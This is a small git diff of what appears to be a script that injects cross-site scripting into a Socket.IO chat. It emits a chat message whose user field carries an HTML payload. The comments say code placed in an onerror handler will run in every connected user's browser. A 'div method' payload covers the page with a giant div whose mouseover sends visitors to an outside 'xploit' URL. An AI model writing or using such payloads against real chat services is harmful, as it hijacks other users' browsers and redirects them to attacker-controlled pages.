@@ -5,7 +5,7 @@ socket.emit('chat message', {
     user: xxs
   })
 // Put your minified code in onerror="CODE HERE"
-// it will then run on everyone broswer, that is connected to the chat
+// it will then run on everyone's broswer, that is connected to the chat
 
 // Div method
 xxs = `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="https://zastix.xyz/xploit">`
